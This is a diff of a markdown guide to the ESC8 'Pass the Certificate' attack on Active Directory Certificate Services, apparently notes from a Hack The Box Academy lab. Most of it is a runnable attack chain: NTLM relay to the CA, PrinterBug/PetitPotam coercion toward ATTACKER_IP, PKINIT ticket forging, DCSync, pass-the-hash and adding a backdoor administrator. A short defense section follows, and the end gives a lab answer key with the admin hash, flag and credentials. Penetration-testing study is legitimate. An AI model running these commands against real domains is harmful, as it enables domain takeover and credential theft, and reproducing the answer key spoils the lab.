@@ -1,55 +1,63 @@
-# Pass the Certificate Attack
+# 📜 Pass the Certificate (ESC8 & ADCS Attacks)
 
 ## 🎯 Overview
 
 **Pass the Certificate** is an advanced Active Directory attack technique that leverages X.509 certificates to obtain Ticket Granting Tickets (TGTs) and ultimately achieve domain compromise. This attack primarily exploits:
-- **Active Directory Certificate Services (AD CS) vulnerabilities**
-- **PKINIT authentication mechanism**
-- **Machine account privileges for DCSync**
-- **ESC8 NTLM relay attacks against ADCS HTTP endpoints**
+
+* **Active Directory Certificate Services (AD CS) vulnerabilities**
+* **PKINIT authentication mechanism**
+* **Machine account privileges for DCSync**
+* **ESC8 NTLM relay attacks against ADCS HTTP endpoints**
 
 > **"Pass-the-Certificate attacks combine ADCS exploitation with Kerberos authentication to achieve domain admin privileges"**
 
 ## 🔐 PKINIT Authentication Architecture
 
 ### Public Key Cryptography for Initial Authentication
+
 **PKINIT** is an extension of the Kerberos protocol that enables:
-- **X.509 certificate-based authentication**
-- **Smart card and certificate logons**
-- **Elimination of password-based pre-authentication**
-- **Machine account authentication via certificates**
+
+* **X.509 certificate-based authentication**
+* **Smart card and certificate logons**
+* **Elimination of password-based pre-authentication**
+* **Machine account authentication via certificates**
 
 ### Certificate Authentication Flow
+
 ```
 Certificate Request → ADCS HTTP Endpoint → Certificate Issuance → PKINIT TGT Request → Domain Controller → TGT with Machine Account Privileges
 ```
 
 ### Attack Prerequisites
-- **ADCS web enrollment enabled** (HTTP endpoint accessible)
-- **Valid domain credentials** for NTLM relay coercion
-- **Network access** to both CA server and Domain Controller
-- **KerberosAuthentication template** (or similar machine template)
+
+* **ADCS web enrollment enabled** (HTTP endpoint accessible)
+* **Valid domain credentials** for NTLM relay coercion
+* **Network access** to both CA server and Domain Controller
+* **KerberosAuthentication template** (or similar machine template)
 
 ## 🎖️ ESC8 - NTLM Relay to ADCS HTTP Endpoint
 
 ### ESC8 Attack Overview
+
 **ESC8** (Escalation 8) is an NTLM relay attack that:
-- **Targets ADCS HTTP web enrollment endpoint**
-- **Relays machine account authentication**
-- **Obtains machine certificates** for domain-joined computers
-- **Bypasses PKI security through relay attack**
+
+* **Targets ADCS HTTP web enrollment endpoint**
+* **Relays machine account authentication**
+* **Obtains machine certificates** for domain-joined computers
+* **Bypasses PKI security through relay attack**
 
 ### Attack Architecture
+
 ```
 Attacker Machine → NTLM Relay Server → Target Machine → ADCS HTTP Endpoint → Machine Certificate → PKINITtools → TGT → DCSync
 ```
-
 
 ## 🚀 ESC8 Attack Execution
 
 ### Phase 1: Environment Setup
 
 #### Required Tools Installation
+
 ```bash
 # Install dependencies (critical for PFX generation)
 sudo apt update
@@ -61,6 +69,7 @@ git clone https://github.com/dirkjanm/PKINITtools.git
 ```
 
 #### Network Reconnaissance
+
 ```bash
 # Identify Domain Controller and Certificate Authority
 nmap -p 88,389,636 TARGET_SUBNET
@@ -73,6 +82,7 @@ curl -k http://CA_SERVER/certsrv/
 ### Phase 2: NTLM Relay Attack Setup
 
 #### Configure ntlmrelayx Listener
+
 ```bash
 # Target ADCS HTTP endpoint with machine template
 sudo impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
@@ -87,6 +97,7 @@ sudo impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp --adcs -smb2su
 ### Phase 3: Authentication Coercion
 
 #### Printer Bug Exploitation
+
 ```bash
 # Force DC machine account authentication
 python3 printerbug.py DOMAIN/username:"password"@DC_IP ATTACKER_IP
@@ -96,6 +107,7 @@ python3 PetitPotam.py ATTACKER_IP DC_IP -u username -p password
 ```
 
 #### Expected Relay Results
+
 ```bash
 # Successful NTLM relay output:
 [*] SMBD-Thread-5: Received connection from DC_IP, attacking target http://CA_SERVER
@@ -111,6 +123,7 @@ python3 PetitPotam.py ATTACKER_IP DC_IP -u username -p password
 ## 🔧 OpenSSL Troubleshooting (Critical)
 
 ### Common PKCS12 Generation Error
+
 ```bash
 # Frequent error in newer Kali versions:
 AttributeError: module 'OpenSSL.crypto' has no attribute 'PKCS12'
@@ -125,6 +138,7 @@ AttributeError: module 'OpenSSL.crypto' has no attribute 'PKCS12'
 ```
 
 ### Package Conflict Issues
+
 ```bash
 # Common Kali package conflicts:
 dpkg: error processing archive certipy-ad_5.0.2-0kali1_all.deb (--unpack):
@@ -136,6 +150,7 @@ error: externally-managed-environment
 ```
 
 ### Fix Method 1: Downgrade pyOpenSSL
+
 ```bash
 # Install compatible OpenSSL version
 sudo pip3 install pyOpenSSL==22.1.0 --break-system-packages --force-reinstall
@@ -146,6 +161,7 @@ python3 -c "import OpenSSL.crypto; print('PKCS12' in dir(OpenSSL.crypto))"
 ```
 
 ### Fix Method 2: Ubuntu Package Method (Tested Working)
+
 ```bash
 # Download compatible packages (ARM64 example - adjust for x64)
 wget http://ports.ubuntu.com/pool/main/p/python-cryptography/python3-cryptography_41.0.7-4ubuntu0.1_arm64.deb
@@ -164,6 +180,7 @@ python3 -c "import OpenSSL.crypto; print('PKCS12' in dir(OpenSSL.crypto))"
 ```
 
 ### Fix Method 2.5: Force Installation (If dpkg errors)
+
 ```bash
 # If getting dpkg conflicts, force installation
 sudo dpkg -i --force-overwrite python3-cryptography_41.0.7-4ubuntu0.1_arm64.deb
@@ -171,6 +188,7 @@ sudo dpkg -i --force-overwrite python3-openssl_24.0.0-1_all.deb
 ```
 
 ### Fix Method 3: Virtual Environment
+
 ```bash
 # Create isolated environment
 python3 -m venv esc8_env
@@ -185,6 +203,7 @@ pip install cryptography==38.0.4
 ### Common Troubleshooting Scenarios
 
 #### Port Already in Use Error
+
 ```bash
 # Error: OSError: [Errno 98] Address already in use
 # Solution: Kill all existing ntlmrelayx processes
@@ -197,6 +216,7 @@ sudo netstat -tulpn | grep :445
 ```
 
 #### Printerbug RPC Errors
+
 ```bash
 # Error: RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE
 # This is NORMAL - the coercion still works even with this error
@@ -207,6 +227,7 @@ sudo netstat -tulpn | grep :445
 ```
 
 #### ntlmrelayx Hanging on "Getting certificate..."
+
 ```bash
 # If attack hangs after "Getting certificate...", the OpenSSL issue is present
 # Certificate was obtained but cannot be saved to PFX format
@@ -216,6 +237,7 @@ sudo netstat -tulpn | grep :445
 ## 🎫 PKINITtools Certificate Processing
 
 ### Environment Setup
+
 ```bash
 # Clone and setup PKINITtools
 cd ~ && git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
@@ -228,6 +250,7 @@ pip3 install -I git+https://github.com/wbond/oscrypto.git
 ```
 
 ### Kerberos Configuration
+
 ```bash
 # Configure /etc/krb5.conf
 sudo tee /etc/krb5.conf > /dev/null << EOF
@@ -249,6 +272,7 @@ echo "DC_IP dc01.domain.local" | sudo tee -a /etc/hosts
 ```
 
 ### TGT Generation from Certificate
+
 ```bash
 # Generate TGT using machine certificate
 python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip DC_IP 'domain.local/dc01$' /tmp/dc.ccache
@@ -270,13 +294,16 @@ klist
 ## 💎 DCSync Attack with Machine Account
 
 ### Machine Account Privileges
+
 Machine accounts in Active Directory have:
-- **Replication privileges** by default
-- **DCSync capability** (DRSUAPI access)
-- **High privileges** for domain operations
-- **No interactive logon restrictions**
+
+* **Replication privileges** by default
+* **DCSync capability** (DRSUAPI access)
+* **High privileges** for domain operations
+* **No interactive logon restrictions**
 
 ### Execute DCSync
+
 ```bash
 # DCSync Administrator account
 impacket-secretsdump -k -no-pass -dc-ip DC_IP -just-dc-user Administrator 'DOMAIN.LOCAL/DC01$'@DC01.DOMAIN.LOCAL
@@ -290,6 +317,7 @@ Administrator:aes256-cts-hmac-sha1-96:AES256_KEY
 ```
 
 ### Full Domain Dump (Optional)
+
 ```bash
 # Extract all domain hashes
 impacket-secretsdump -k -no-pass -dc-ip DC_IP -just-dc 'DOMAIN.LOCAL/DC01$'@DC01.DOMAIN.LOCAL
@@ -298,6 +326,7 @@ impacket-secretsdump -k -no-pass -dc-ip DC_IP -just-dc 'DOMAIN.LOCAL/DC01$'@DC01
 ## 👑 Administrative Access via Pass-the-Hash
 
 ### Evil-WinRM Connection
+
 ```bash
 # Deactivate venv (system evil-winrm needed)
 deactivate
@@ -312,6 +341,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 ### Post-Exploitation
+
 ```powershell
 # Verify privileges
 whoami /all
@@ -329,21 +359,24 @@ net localgroup administrators backdoor /add
 ## 🎯 HTB Academy Lab Walkthrough
 
 ### Lab Environment
-- **Domain**: INLANEFREIGHT.LOCAL
-- **Domain Controller**: dc01.inlanefreight.local (10.129.234.174)
-- **Certificate Authority**: 10.129.234.172
-- **Credentials**: wwhite:package5shores_topher1
-- **Target**: Administrator's flag
+
+* **Domain**: INLANEFREIGHT.LOCAL
+* **Domain Controller**: dc01.inlanefreight.local (10.129.234.174)
+* **Certificate Authority**: 10.129.234.172
+* **Credentials**: wwhite:package5shores\_topher1
+* **Target**: Administrator's flag
 
 ### Step-by-Step Execution
 
 #### 1. ESC8 NTLM Relay Setup
+
 ```bash
 # Terminal 1: Start ntlmrelayx
 sudo impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
 ```
 
 #### 2. Authentication Coercion
+
 ```bash
 # Terminal 2: Force DC authentication
 python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 ATTACKER_IP
@@ -352,6 +385,7 @@ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129
 ```
 
 #### 3. PKINITtools Setup
+
 ```bash
 # Setup environment
 cd ~/PKINITtools
@@ -365,6 +399,7 @@ export KRB5CCNAME=/tmp/dc.ccache
 ```
 
 #### 4. DCSync Administrator
+
 ```bash
 # Extract Administrator hash
 impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
@@ -373,6 +408,7 @@ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrat
 ```
 
 #### 5. Administrator Access
+
 ```bash
 # Connect with hash
 evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
@@ -385,6 +421,7 @@ evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e
 ### Validation and Verification
 
 #### Confirm Certificate Generation
+
 ```bash
 # After ntlmrelayx success, verify PFX file exists
 ls -la DC01*.pfx
@@ -395,6 +432,7 @@ du -h DC01*.pfx
 ```
 
 #### Validate TGT Generation
+
 ```bash
 # After gettgtpkinit.py, confirm ticket cache
 ls -la /tmp/dc.ccache
@@ -405,6 +443,7 @@ klist
 ```
 
 #### Confirm DCSync Success
+
 ```bash
 # After secretsdump, look for specific output pattern:
 # Administrator:500:aad3b435b51404eeaad3b435b51404ee:[32-char-hash]:::
@@ -417,6 +456,7 @@ echo "fd02e525dd676fd8ca04e200d265f20c" > admin_hash.txt
 ## 🛡️ Defense and Detection
 
 ### Attack Detection
+
 ```bash
 # Event IDs to monitor:
 # 4768 - Kerberos TGT Request (unusual machine accounts)
@@ -430,6 +470,7 @@ echo "fd02e525dd676fd8ca04e200d265f20c" > admin_hash.txt
 ```
 
 ### Prevention Strategies
+
 ```bash
 # ADCS hardening:
 1. Disable HTTP enrollment (use HTTPS only)
@@ -445,6 +486,7 @@ echo "fd02e525dd676fd8ca04e200d265f20c" > admin_hash.txt
 ```
 
 ### Monitoring Queries
+
 ```bash
 # PowerShell: Detect unusual certificate requests
 Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4886,4887} | 
@@ -470,6 +512,7 @@ where count > 10
 ## 🔍 Alternative Attack Vectors
 
 ### Shadow Credentials
+
 ```bash
 # Alternative to ESC8 using pywhisker
 python3 pywhisker.py -d DOMAIN.LOCAL -u username -p password --target DC01$ --action add
@@ -479,6 +522,7 @@ python3 gettgtpkinit.py -cert-pfx USER.pfx -pfx-pass PASSWORD -dc-ip DC_IP DOMAI
 ```
 
 ### Other ESC Techniques
+
 ```bash
 # ESC1 - Template misconfiguration
 certipy template -u username@domain.local -p password -dc-ip DC_IP
@@ -493,6 +537,7 @@ certipy req -u username@domain.local -p password -ca CA_NAME -template TEMPLATE 
 ## 🚀 Quick Reference - ESC8 Attack Chain
 
 ### Complete Attack Commands
+
 ```bash
 # 1. Start ntlmrelayx (Terminal 1)
 sudo impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
@@ -516,6 +561,7 @@ evil-winrm -i dc01.domain.local -u Administrator -H ADMIN_HASH
 ```
 
 ### Emergency OpenSSL Fix
+
 ```bash
 # Quick fix for PKCS12 errors
 sudo pip3 install pyOpenSSL==22.1.0 --break-system-packages --force-reinstall
@@ -523,8 +569,9 @@ python3 -c "import OpenSSL.crypto; print('PKCS12' in dir(OpenSSL.crypto))"
 ```
 
 ## 🎯 HTB Academy Answer Key
-- **Attack Type**: ESC8 NTLM Relay to ADCS
-- **Certificate Generated**: DC01$.pfx (machine certificate)
-- **Administrator Hash**: fd02e525dd676fd8ca04e200d265f20c
-- **Final Flag**: a1fc497a8433f5a1b4c18274019a2cdb
-- **Critical Fix**: pyOpenSSL downgrade to version 22.1.0
+
+* **Attack Type**: ESC8 NTLM Relay to ADCS
+* **Certificate Generated**: DC01$.pfx (machine certificate)
+* **Administrator Hash**: fd02e525dd676fd8ca04e200d265f20c
+* **Final Flag**: a1fc497a8433f5a1b4c18274019a2cdb
+* **Critical Fix**: pyOpenSSL downgrade to version 22.1.0
